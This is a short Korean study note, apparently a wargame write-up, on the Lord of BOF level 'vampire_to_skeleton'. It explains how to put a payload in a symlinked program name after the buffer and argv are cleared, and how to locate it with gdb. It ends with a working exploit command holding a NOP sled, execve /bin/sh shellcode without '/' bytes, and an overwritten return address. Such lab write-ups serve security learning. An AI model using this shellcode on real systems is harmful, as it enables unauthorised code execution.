#week2  
##lob  
###vampire_to_skeleton  
skeleton.c를 분석해보면 buffer와 argv 모두 초기화하는 것을 파악 가능하다.  
멘붕와서 검색했더니 이름 부분에 넣는다고 한다.  
skeleton을 copy 해준 후 ln-s을 135자로 이름을 만들어준다.  
그후 gdb를 돌려 argv의 초기화가 끝난 시점인 main+283에 브레이크포인트를 걸어준다.  
다음 이름은 위쪽에 저장되는 특성에 따라 0xbfffffff 주변을 x/100s로 이름이 어디 저장되는지 찾는다.    
0xbfffff69에 저장되는 것을 파악했다.  
이제 0x2f(/)가 들어있지 않은 쉘코드를 아래와 같이 포함시켜 bash를 확인한다.   
아래에는 경로를 생각해서 20정도를 더해준것을 확인가능하다.  
 ./$(python -c 'print("\x90"*100+"\x31\xc0\x50\xbe\x2e\x72\x67\x81\xc6\x01\x01  
 \x01\x01\x56\xbf\x2e\x62\x69\x6e\x47\x57\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+" "+"\x90"*44+"\x7d\xff\xff\xbf")')
